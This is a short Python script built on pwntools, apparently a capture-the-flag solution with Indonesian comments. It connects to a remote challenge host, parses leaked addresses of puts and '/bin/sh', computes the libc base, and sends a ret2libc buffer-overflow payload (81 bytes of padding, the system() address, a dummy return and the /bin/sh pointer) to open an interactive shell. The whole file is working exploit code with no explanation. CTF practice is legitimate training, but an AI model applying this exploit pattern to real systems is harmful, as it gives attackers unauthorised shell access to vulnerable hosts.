from pwn import *

context.binary = './chall'
elf = context.binary
libc = ELF('./libc-2.27.so')

p = remote('152.118.201.241', 3016)

# ambil leak
p.recvuntil(b'/bin/sh: ')
binsh = int(p.recvline().strip(), 16)

p.recvuntil(b'puts: ')
puts_leak = int(p.recvline().strip(), 16)

# hitung libc base
libc_base = puts_leak - libc.symbols['puts']

system = libc_base + libc.symbols['system']

offset = 81

payload = b"A"*offset
payload += p32(system)
payload += b"BBBB"     # return addr dummy
payload += p32(binsh)  # argumen

p.sendline(payload)
p.interactive()